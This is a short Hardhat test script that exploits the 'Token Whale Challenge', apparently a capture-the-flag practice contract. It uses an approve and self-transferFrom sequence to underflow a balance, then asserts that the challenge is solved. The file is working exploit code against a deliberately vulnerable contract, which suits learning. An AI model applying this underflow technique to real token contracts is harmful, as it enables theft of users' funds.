const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Token Whale Challenge exploit", function () {
  it("Attacker should be able to get more than 1_000_000 tokens", async function () {
    const [user1, user2] = await ethers.getSigners();
    const MILLION = 1000000;
    const VALUE = 1;

    const tokenWhaleChallenge = await ethers.deployContract(
      "TokenWhaleChallenge",
      [user1.address]
    );
    await tokenWhaleChallenge.waitForDeployment();

    let tx = await tokenWhaleChallenge
      .connect(user1)
      .approve(user2.address, VALUE);
    await tx.wait();

    tx = await tokenWhaleChallenge
      .connect(user2)
      .transferFrom(user1.address, user1.address, VALUE);
    await tx.wait();

    tx = await tokenWhaleChallenge
      .connect(user2)
      .transfer(user1.address, MILLION - VALUE);
    await tx.wait();

    expect(await tokenWhaleChallenge.isComplete()).to.be.true;
  });
});
